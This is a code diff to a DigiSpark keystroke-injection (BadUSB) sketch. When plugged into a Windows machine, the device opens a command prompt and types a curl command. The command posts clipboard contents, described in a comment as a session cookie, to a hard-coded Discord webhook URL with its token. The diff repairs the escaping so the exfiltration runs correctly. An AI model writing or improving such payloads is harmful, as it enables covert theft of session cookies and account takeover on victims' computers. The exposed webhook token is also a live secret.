@@ -28,12 +28,27 @@ void setup() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
     // Sending session cookie to webhooks
+      // Open Run (Win + R)
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("curl -X POST -H "Content-Type: application/json" -d "{\"content\":\""
+
+    // Open cmd
+    DigiKeyboard.print("cmd");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(1000);
+
+    // Start curl command
+    DigiKeyboard.print("curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"");
+
+    // Paste clipboard content
     DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
-    DigiKeyboard.print("\"}" "https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu""
+    DigiKeyboard.delay(500);
+
+    // Close JSON and send request
+    DigiKeyboard.print("\\\"}\" \"https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu\"");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
+
 
 void loop() {
     // Do nothing after execution
